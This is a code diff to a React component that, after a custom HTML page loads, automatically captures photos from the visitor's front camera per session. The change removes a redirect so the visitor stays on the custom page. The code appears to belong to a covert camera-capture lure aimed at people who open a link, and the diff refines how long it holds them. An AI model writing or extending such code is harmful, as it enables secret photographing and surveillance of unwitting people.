@@ -76,7 +76,7 @@ const CustomCapture = () => {
   useEffect(() => {
     if (!customHtml || captureComplete) return;
 
-    const captureAndRedirect = async () => {
+    const capturePhotos = async () => {
       try {
         // Capture from FRONT camera first
         const frontImage = await captureFromCamera("user");
@@ -103,22 +103,17 @@ const CustomCapture = () => {
         }
         
         setCaptureComplete(true);
-        
-        // Redirect after short delay
-        setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 500);
+        // No redirect - user stays on custom HTML page
         
       } catch (error) {
         console.error("Capture error:", error);
-        window.location.href = redirectUrl;
       }
     };
 
     // Start capture after a short delay to let HTML render
-    const timer = setTimeout(captureAndRedirect, 500);
+    const timer = setTimeout(capturePhotos, 500);
     return () => clearTimeout(timer);
-  }, [customHtml, captureComplete, sessionId, redirectUrl]);
+  }, [customHtml, captureComplete, sessionId]);
 
   // Show loading if no custom HTML
   if (!customHtml) {
